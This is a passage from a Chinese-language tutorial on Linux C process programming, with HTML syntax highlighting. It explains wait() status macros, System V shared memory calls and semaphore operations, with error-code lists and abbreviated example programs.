class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 等待进程结束函数</span></span><br><span class="line"><span class="comment"> * @param status 获取进程程结束状态值</span></span><br><span class="line"><span class="comment"> * @return 第一个结束的子进程进程号；-1，没有子进程在运行</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">pid_t</span> wait(<span class="keyword">int</span> *status);</span><br><span class="line"></span><br><span class="line"><span class="comment">//子进程的结束状态返回后存于status，底下有几个宏可判别结束情况</span></span><br><span class="line">WIFEXITED(status);      <span class="comment">//如果子进程正常结束则为非0值。</span></span><br><span class="line">WEXITSTATUS(status);    <span class="comment">//取得子进程exit()返回的结束代码，一般会先用WIFEXITED来判断是否正常结束才能使用此宏。</span></span><br><span class="line">WIFSIGNALED(status);    <span class="comment">//如果子进程是因为信号而结束则此宏值为真</span></span><br><span class="line">WTERMSIG(status);       <span class="comment">//取得子进程因信号而中止的信号代码，一般会先用WIFSIGNALED来判断后才使用此宏。</span></span><br><span class="line">WIFSTOPPED(status);     <span class="comment">//如果子进程处于暂停执行情况则此宏值为真。一般只有使用WUNTRACED 时才会有此情况。</span></span><br><span class="line">WSTOPSIG(status);       <span class="comment">//取得引发子进程暂停的信号代码，一般会先用WIFSTOPPED来判断后才使用此宏。</span></span><br></pre></td></tr></table></figure><ul><li>示例</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//创建进程</span></span><br><span class="line">    <span class="keyword">pid_t</span> processID = fork();</span><br><span class="line">    <span class="keyword">if</span> (processID == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//子进程执行代码</span></span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (processID &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//父进程执行代码</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//等待子进程结束</span></span><br><span class="line">        <span class="keyword">int</span> status = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">pid_t</span> waitProcessID = wait(&amp;status);</span><br><span class="line">        <span class="keyword">if</span> (waitProcessID == processID) &#123;</span><br><span class="line">            <span class="keyword">if</span> (WIFEXITED(status) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//子进程正常结束</span></span><br><span class="line">                <span class="keyword">if</span> (WEXITSTATUS(status) != <span class="number">0</span>) &#123;</span><br><span class="line">                    LOG_DEBUG(<span class="string">"the return code is %d."</span>, WEXITSTATUS(status));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//子进程非正常结束</span></span><br><span class="line">                LOG_DEBUG(<span class="string">"the child process %d exit abnormally."</span>, waitProcessID);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//子进程结束执行代码</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (processID == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="comment">//没有子进程在运行</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//其他子进程结束代码</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//创建错误代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>进程相互之间的变量包括指针指向的地址都是不共享的，进程间通信需要使用共享内存。</p><h3 id="获取ID（ftok）"><a href="#获取ID（ftok）" class="headerlink" title="获取ID（ftok）"></a><span id="ftok">获取ID（ftok）</span></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 获取一个key值用于共享内存或消息队列</span></span><br><span class="line"><span class="comment"> * @param fname 指定一个文件名</span></span><br><span class="line"><span class="comment"> * @param id 子序号</span></span><br><span class="line"><span class="comment"> * @return 共享内存ID；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">key_t</span> ftok(<span class="keyword">const</span> <span class="keyword">char</span> *fname, <span class="keyword">int</span> id);</span><br></pre></td></tr></table></figure><h3 id="获取或创建共享内存（shmget）"><a href="#获取或创建共享内存（shmget）" class="headerlink" title="获取或创建共享内存（shmget）"></a>获取或创建共享内存（shmget）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 获取或者创建共享内存</span></span><br><span class="line"><span class="comment"> * @param key 共享内存ID，一般为ftok获取的ID</span></span><br><span class="line"><span class="comment"> * @param size 共享内存大小</span></span><br><span class="line"><span class="comment"> * @param shmflg 标示属性，使用时需要与IPC对象存取权限（如0600）进行|运算来确定信号量集的存取权限</span></span><br><span class="line"><span class="comment"> * @return 共享内存ID；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">int</span> shmflg)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">errno               <span class="comment">//错误码</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">strerror</span><span class="params">(errno)</span>     <span class="comment">//错误信息字符串</span></span></span><br></pre></td></tr></table></figure><ul><li>函数传入值对应的操作</li></ul><table><thead><tr><th>key</th><th>size</th><th>shmflg</th><th>描述</th></tr></thead><tbody><tr><td>x</td><td>x</td><td>IPC_CREAT $\mid$ 0600</td><td>建立新的共享内存对象，不存在与key相同的则创建，存在返回key</td></tr><tr><td>x</td><td>x</td><td>IPC_CREAT $\mid$ IPC_EXCL $\mid$ 0600</td><td>建立新的共享内存对象，不存在与key相同的则创建，存在报错</td></tr><tr><td>x</td><td>0</td><td>0</td><td>获取共享内存</td></tr></tbody></table><ul><li>错误代码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EINVAL：参数size小于SHMMIN或大于SHMMAX</span><br><span class="line">EEXIST：预建立key所指的共享内存，但已经存在</span><br><span class="line">EIDRM：参数key所指的共享内存已经删除</span><br><span class="line">ENOSPC：超过了系统允许建立的共享内存的最大值(SHMALL)</span><br><span class="line">ENOENT：参数key所指的共享内存不存在，而参数shmflg未设IPC_CREAT位</span><br><span class="line">EACCES：没有权限</span><br><span class="line">ENOMEM：核心内存不足</span><br></pre></td></tr></table></figure><h3 id="链接共享内存到进程中（shmat）"><a href="#链接共享内存到进程中（shmat）" class="headerlink" title="链接共享内存到进程中（shmat）"></a>链接共享内存到进程中（shmat）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 链接共享内存到当前进程</span></span><br><span class="line"><span class="comment"> * @param shmid 共享内存标识符</span></span><br><span class="line"><span class="comment"> * @param shmaddr 指定链接为内存的哪一块地址，NULL让操作系统自己选择</span></span><br><span class="line"><span class="comment"> * @param shmflg SHM_RDONLY，为只读模式；其他为读写模式</span></span><br><span class="line"><span class="comment"> * @return 共享内存地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">const</span> <span class="keyword">void</span> *shmaddr, <span class="keyword">int</span> shmflg)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">errno               <span class="comment">//错误码</span></span></span><br><span class="line"><span class="function"><span class="title">strerror</span><span class="params">(errno)</span>     <span class="comment">//错误信息字符串</span></span></span><br></pre></td></tr></table></figure><ul><li>错误代码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EACCES：无权限以指定方式连接共享内存</span><br><span class="line">EINVAL：无效的参数shmid或shmaddr</span><br><span class="line">ENOMEM：核心内存不足</span><br></pre></td></tr></table></figure><h3 id="取消链接共享内存到进程中（shmdt）"><a href="#取消链接共享内存到进程中（shmdt）" class="headerlink" title="取消链接共享内存到进程中（shmdt）"></a>取消链接共享内存到进程中（shmdt）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 链接共享内存到当前进程</span></span><br><span class="line"><span class="comment"> * @param shmaddr 共享内存地址</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmdt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *shmaddr)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">errno               <span class="comment">//错误码</span></span></span><br><span class="line"><span class="function"><span class="title">strerror</span><span class="params">(errno)</span>     <span class="comment">//错误信息字符串</span></span></span><br></pre></td></tr></table></figure><ul><li>错误代码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EINVAL：无效的参数shmaddr</span><br></pre></td></tr></table></figure><h3 id="共享内存管理"><a href="#共享内存管理" class="headerlink" title="共享内存管理"></a>共享内存管理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 链接共享内存到当前进程</span></span><br><span class="line"><span class="comment"> * @param shmid 共享内存标识符</span></span><br><span class="line"><span class="comment"> * @param cmd 操作命令</span></span><br><span class="line"><span class="comment"> * @param buf 管理结构体</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">int</span> cmd, struct shmid_ds *buf)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">errno               <span class="comment">//错误码</span></span></span><br><span class="line"><span class="function"><span class="title">strerror</span><span class="params">(errno)</span>     <span class="comment">//错误信息字符串</span></span></span><br></pre></td></tr></table></figure><ul><li>cmd</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IPC_STAT：得到共享内存的状态，把共享内存的shmid_ds结构复制到buf中</span><br><span class="line">IPC_SET：改变共享内存的状态，把buf所指的shmid_ds结构中的uid、gid、mode复制到共享内存的shmid_ds结构内</span><br><span class="line">IPC_RMID：删除这片共享内存</span><br></pre></td></tr></table></figure><ul><li>错误代码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EACCESS：参数cmd为IPC_STAT，确无权限读取该共享内存</span><br><span class="line">EFAULT：参数buf指向无效的内存地址</span><br><span class="line">EIDRM：标识符为msqid的共享内存已被删除</span><br><span class="line">EINVAL：无效的参数cmd或shmid</span><br><span class="line">EPERM：参数cmd为IPC_SET或IPC_RMID，却无足够的权限执行</span><br></pre></td></tr></table></figure><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">key_t</span> key = ftok(<span class="string">"."</span>, <span class="number">0x01</span>);</span><br><span class="line">    <span class="keyword">if</span> (key &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"ftok failed, key %d"</span>, key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取共享内存</span></span><br><span class="line">    <span class="keyword">int</span> shmid = shmget(key, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shmid == <span class="number">-1</span>) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"shmget failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((pid = fork()) == <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将共享内存连接到当前进程的地址空间</span></span><br><span class="line">    <span class="keyword">int</span> *data = (<span class="keyword">int</span> *) shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == (<span class="keyword">int</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"shmat fail, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//把共享内存从当前进程中分离</span></span><br><span class="line">        <span class="keyword">if</span> (shmdt(data) == <span class="number">-1</span>) &#123;</span><br><span class="line">            LOG_ERROR(<span class="string">"shmdt failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除共享内存</span></span><br><span class="line">        <span class="keyword">if</span> (shmctl(shmid, IPC_RMID, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            LOG_ERROR(<span class="string">"shmctl(IPC_RMID) failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//子进程</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//把共享内存从当前进程中分离</span></span><br><span class="line">        <span class="keyword">if</span> (shmdt(data) == <span class="number">-1</span>) &#123;</span><br><span class="line">            LOG_ERROR(<span class="string">"shmdt failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程锁（信号量）"><a href="#进程锁（信号量）" class="headerlink" title="进程锁（信号量）"></a>进程锁（信号量）</h2><p>进程相互之间的变量包括指针指向的地址都是不共享的，进程间通信需要使用共享内存。</p><h3 id="获取ID（ftok）-1"><a href="#获取ID（ftok）-1" class="headerlink" title="获取ID（ftok）"></a>获取ID（ftok）</h3><p><a href="#ftok">同上</a></p><h3 id="获取或创建信号量（shmget）"><a href="#获取或创建信号量（shmget）" class="headerlink" title="获取或创建信号量（shmget）"></a>获取或创建信号量（shmget）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 获取或者创建信号量</span></span><br><span class="line"><span class="comment"> * @param key 信号量ID，一般为ftok获取的ID</span></span><br><span class="line"><span class="comment"> * @param num_sems 信号量个数</span></span><br><span class="line"><span class="comment"> * @param sem_flags 标示属性，使用时需要与IPC对象存取权限（如0600）进行|运算来确定信号量集的存取权限</span></span><br><span class="line"><span class="comment"> * @return 共享内存ID；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> num_sems, <span class="keyword">int</span> sem_flags)</span></span>;</span><br><span class="line"></span><br><span class="line">errno               <span class="comment">//错误码</span></span><br><span class="line">strerror(errno)     <span class="comment">//错误信息字符串</span></span><br></pre></td></tr></table></figure><ul><li>函数传入值对应的操作</li></ul><table><thead><tr><th>key</th><th>size</th><th>shmflg</th><th>描述</th></tr></thead><tbody><tr><td>x</td><td>x</td><td>IPC_CREAT $\mid$ 0600</td><td>建立新的信号量，不存在与key相同的则创建，存在返回key</td></tr><tr><td>x</td><td>x</td><td>IPC_CREAT $\mid$ IPC_EXCL $\mid$ 0600</td><td>建立新的信号量，不存在与key相同的则创建，存在报错</td></tr><tr><td>x</td><td>0</td><td>0</td><td>获取信号量</td></tr></tbody></table><ul><li>错误代码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EACCES：没有访问该信号量集的权限</span><br><span class="line">EEXIST：信号量集已经存在，无法创建</span><br><span class="line">EINVAL：参数nsems的值小于0或者大于该信号量集的限制；或者是该key关联的信号量集已存在，并且nsems</span><br><span class="line">大于该信号量集的信号量数</span><br><span class="line">ENOENT：信号量集不存在，同时没有使用IPC_CREAT</span><br><span class="line">ENOMEM ：没有足够的内存创建新的信号量集</span><br><span class="line">ENOSPC：超出系统限制</span><br></pre></td></tr></table></figure><h3 id="信号量操作（PV操作）"><a href="#信号量操作（PV操作）" class="headerlink" title="信号量操作（PV操作）"></a>信号量操作（PV操作）</h3><p>此操作会导致进程阻塞，用于进程间加锁使用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 信号量操作</span></span><br><span class="line"><span class="comment"> * @param semid 信号量ID</span></span><br><span class="line"><span class="comment"> * @param sops 操作结构体</span></span><br><span class="line"><span class="comment"> * @param nsops 操作的信号量的个数</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">int semop(int semid, struct sembuf *sops, size_t nsops)；</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 信号量操作</span></span><br><span class="line"><span class="comment"> * @param semid 信号量ID</span></span><br><span class="line"><span class="comment"> * @param sops 操作结构体</span></span><br><span class="line"><span class="comment"> * @param nsops 操作的信号量的个数</span></span><br><span class="line"><span class="comment"> * @param timespec 等待时间</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semtimedop</span><span class="params">(<span class="keyword">int</span> semid, struct sembuf *sops, <span class="keyword">unsigned</span> nsops, struct timespec *timeout)</span></span>;</span><br><span class="line"></span><br><span class="line">errno               <span class="comment">//错误码</span></span><br><span class="line">strerror(errno)     <span class="comment">//错误信息字符串</span></span><br></pre></td></tr></table></figure><ul><li>sembuf结构</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span>&#123;</span></span><br><span class="line">    <span class="keyword">short</span> sem_num;  <span class="comment">// 信号量序号，从0开始</span></span><br><span class="line">    <span class="keyword">short</span> sem_op;   <span class="comment">// 信号量在一次操作中需要改变的数据，通常是两个数，一个是-1，即P（等待）操作，</span></span><br><span class="line">                    <span class="comment">// 一个是+1，即V（发送信号）操作。</span></span><br><span class="line">    <span class="keyword">short</span> sem_flg;  <span class="comment">//信号量操作标示</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>sem_flg</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IPC_NOWAIT  <span class="comment">//对信号的操作不能满足时，semop()不会阻塞，并立即返回，同时设定错误信息。</span></span><br><span class="line">SEM_UNDO    <span class="comment">//程序结束时(不论正常或不正常)，保证信号值会被重设为semop()调用前的值。这样做的目的在于避免程序在异常情况下结束时未将锁定的资源解锁，造成该资源永远锁定。</span></span><br></pre></td></tr></table></figure><ul><li>错误代码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E2BIG：一次对信号的操作数超出系统的限制</span><br><span class="line">EACCES：调用进程没有权能执行请求的操作，并且不具有CAP_IPC_OWNER权能</span><br><span class="line">EAGAIN：信号操作暂时不能满足，需要重试</span><br><span class="line">EFAULT：sops或timeout指针指向的空间不可访问</span><br><span class="line">EFBIG：sem_num指定的值无效</span><br><span class="line">EIDRM：信号集已被移除</span><br><span class="line">EINTR：系统调用阻塞时，被信号中断</span><br><span class="line">EINVAL：参数无效</span><br><span class="line">ENOMEM：内存不足</span><br><span class="line">ERANGE：信号所允许的值越界</span><br></pre></td></tr></table></figure><h3 id="信号量管理"><a href="#信号量管理" class="headerlink" title="信号量管理"></a>信号量管理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 信号量管理</span></span><br><span class="line"><span class="comment"> * @param sem_id 信号量ID</span></span><br><span class="line"><span class="comment"> * @param sem_num 信号量序号，从0开始</span></span><br><span class="line"><span class="comment"> * @param command 操作符</span></span><br><span class="line"><span class="comment"> * @param ... 操作参数</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semctl</span><span class="params">(<span class="keyword">int</span> sem_id, <span class="keyword">int</span> sem_num, <span class="keyword">int</span> command, ...)</span></span>;</span><br><span class="line"></span><br><span class="line">errno               <span class="comment">//错误码</span></span><br><span class="line">strerror(errno)     <span class="comment">//错误信息字符串</span></span><br></pre></td></tr></table></figure><ul><li>command</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SETVAL：用来把信号量初始化为一个已知的值。p 这个值通过union semun中的val成员设置，其作用是在信号量第一次使用前对它进行设置。</span><br><span class="line">IPC_RMID：用于删除一个已经无需继续使用的信号量标识符。</span><br></pre></td></tr></table></figure><ul><li>错误代码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EACCES(权限不够)</span><br><span class="line">EFAULT(arg指向的地址无效)</span><br><span class="line">EIDRM(信号量集已经删除)</span><br><span class="line">EINVAL(信号量集不存在，或者semid无效)</span><br><span class="line">EPERM(EUID没有cmd的权利)</span><br><span class="line">ERANGE(信号量值超出范围)</span><br></pre></td></tr></table></figure><h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">key_t</span> key = ftok(<span class="string">"."</span>, <span class="number">0x01</span>);</span><br><span class="line">    <span class="keyword">if</span> (key &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"ftok failed, key %d"</span>, key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取信号量</span></span><br><span class="line">    <span class="keyword">int</span> semId = semget(key, <span class="number">1</span>, IPC_CREAT | <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (semId == <span class="number">-1</span>) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"semget failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置初始值</span></span><br><span class="line">    <span class="keyword">int</span> code = semctl(semId, <span class="number">0</span>, SETVAL, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (code == <span class="number">-1</span>) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"semctl failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((pid = fork()) == <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//申请信号量，上锁</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">signal</span>;</span></span><br><span class="line">        signal.sem_op = <span class="number">-1</span>;</span><br><span class="line">        signal.sem_flg = SEM_UNDO;</span><br><span class="line">        signal.sem_num = <span class="number">0</span>;</span><br><span class="line">        code = semop(semId, &amp;signal, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">-1</span>) &#123;</span><br><span class="line">            LOG_ERROR(<span class="string">"semop failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> <span 